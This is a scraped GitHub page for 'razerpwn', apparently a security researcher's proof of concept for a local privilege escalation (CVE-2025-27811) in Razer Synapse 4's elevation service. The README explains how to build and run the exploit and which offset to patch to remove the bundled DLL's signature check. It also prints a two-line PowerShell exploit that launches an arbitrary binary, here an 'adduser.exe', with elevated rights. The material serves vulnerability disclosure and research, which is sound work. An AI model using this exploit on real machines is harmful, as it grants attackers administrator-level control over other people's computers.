# https://github.com/sensepost/bloatware-pwn/tree/main/razerpwn

[Skip to content](https://github.com/sensepost/bloatware-pwn/tree/main/razerpwn#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/sensepost/bloatware-pwn/tree/main/razerpwn) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/sensepost/bloatware-pwn/tree/main/razerpwn) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/sensepost/bloatware-pwn/tree/main/razerpwn) to refresh your session.Dismiss alert

{{ message }}

[sensepost](https://github.com/sensepost)/ **[bloatware-pwn](https://github.com/sensepost/bloatware-pwn)** Public

- [Notifications](https://github.com/login?return_to=%2Fsensepost%2Fbloatware-pwn) You must be signed in to change notification settings
- [Fork\\
5](https://github.com/login?return_to=%2Fsensepost%2Fbloatware-pwn)
- [Star\\
84](https://github.com/login?return_to=%2Fsensepost%2Fbloatware-pwn)


## Collapse file tree

## Files

main

Search this repository

/

# razerpwn

/

Copy path

## Directory actions

## More options

More options

## Directory actions

## More options

More options

## Latest commit

[![leonjza](https://avatars.githubusercontent.com/u/1148127?v=4&size=40)](https://github.com/leonjza)[leonjza](https://github.com/sensepost/bloatware-pwn/commits?author=leonjza)

[(feat) first poc commit](https://github.com/sensepost/bloatware-pwn/commit/afd89644955cb3f9c3af283888cb655a141fcb88)

6 months agoAug 5, 2025

[afd8964](https://github.com/sensepost/bloatware-pwn/commit/afd89644955cb3f9c3af283888cb655a141fcb88) · 6 months agoAug 5, 2025

## History

[History](https://github.com/sensepost/bloatware-pwn/commits/main/razerpwn)

Open commit details

[View commit history for this file.](https://github.com/sensepost/bloatware-pwn/commits/main/razerpwn) History

/

# razerpwn

/

Top

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ### parent directory<br> [..](https://github.com/sensepost/bloatware-pwn/tree/main) |
| [razerpwn](https://github.com/sensepost/bloatware-pwn/tree/main/razerpwn/razerpwn "razerpwn") | [razerpwn](https://github.com/sensepost/bloatware-pwn/tree/main/razerpwn/razerpwn "razerpwn") | [(feat) first poc commit](https://github.com/sensepost/bloatware-pwn/commit/afd89644955cb3f9c3af283888cb655a141fcb88 "(feat) first poc commit") | 6 months agoAug 5, 2025 |
| [.gitignore](https://github.com/sensepost/bloatware-pwn/blob/main/razerpwn/.gitignore ".gitignore") | [.gitignore](https://github.com/sensepost/bloatware-pwn/blob/main/razerpwn/.gitignore ".gitignore") | [(feat) first poc commit](https://github.com/sensepost/bloatware-pwn/commit/afd89644955cb3f9c3af283888cb655a141fcb88 "(feat) first poc commit") | 6 months agoAug 5, 2025 |
| [README.md](https://github.com/sensepost/bloatware-pwn/blob/main/razerpwn/README.md "README.md") | [README.md](https://github.com/sensepost/bloatware-pwn/blob/main/razerpwn/README.md "README.md") | [(feat) first poc commit](https://github.com/sensepost/bloatware-pwn/commit/afd89644955cb3f9c3af283888cb655a141fcb88 "(feat) first poc commit") | 6 months agoAug 5, 2025 |
| [razerpwn.sln](https://github.com/sensepost/bloatware-pwn/blob/main/razerpwn/razerpwn.sln "razerpwn.sln") | [razerpwn.sln](https://github.com/sensepost/bloatware-pwn/blob/main/razerpwn/razerpwn.sln "razerpwn.sln") | [(feat) first poc commit](https://github.com/sensepost/bloatware-pwn/commit/afd89644955cb3f9c3af283888cb655a141fcb88 "(feat) first poc commit") | 6 months agoAug 5, 2025 |
| [simple\_service.dll](https://github.com/sensepost/bloatware-pwn/blob/main/razerpwn/simple_service.dll "simple_service.dll") | [simple\_service.dll](https://github.com/sensepost/bloatware-pwn/blob/main/razerpwn/simple_service.dll "simple_service.dll") | [(feat) first poc commit](https://github.com/sensepost/bloatware-pwn/commit/afd89644955cb3f9c3af283888cb655a141fcb88 "(feat) first poc commit") | 6 months agoAug 5, 2025 |
| View all files |

## [README.md](https://github.com/sensepost/bloatware-pwn/tree/main/razerpwn\#readme)

Outline

# razerpwn

[Permalink: razerpwn](https://github.com/sensepost/bloatware-pwn/tree/main/razerpwn#razerpwn)

Razer Synapse 4, razer\_elevation\_service.exe v1.1.0.5 LPE PoC for CVE-2025-27811

## build

[Permalink: build](https://github.com/sensepost/bloatware-pwn/tree/main/razerpwn#build)

Open the .sln in Visual Studio. Community Edition should be fine. Then build the solution.

## simple\_service.dll

[Permalink: simple_service.dll](https://github.com/sensepost/bloatware-pwn/tree/main/razerpwn#simple_servicedll)

The bundled `simple_service.dll` is original DLL with the PE signature validation routine patched out. If you want to create your own DLL from the original, patch out the PE signature validation in function offset 0x44294.

## running

[Permalink: running](https://github.com/sensepost/bloatware-pwn/tree/main/razerpwn#running)

After building the PoC, ensure that `simple_service.dll` is next to your built `razerpwn.exe` file. Then:

```
.\razerpwn.exe
```

## powershell alternative

[Permalink: powershell alternative](https://github.com/sensepost/bloatware-pwn/tree/main/razerpwn#powershell-alternative)

Instead of using this complex PoC, this vulnerability can also be exploited using the following PowerShell, where `adduser.exe` is the target binary to run:

```
$com = New-Object -ComObject 'RzUtility.Elevator’
$com.LaunchProcessNoWait("c:\users\user\desktop\adduser.exe", "", 1)
```

You can’t perform that action at this time.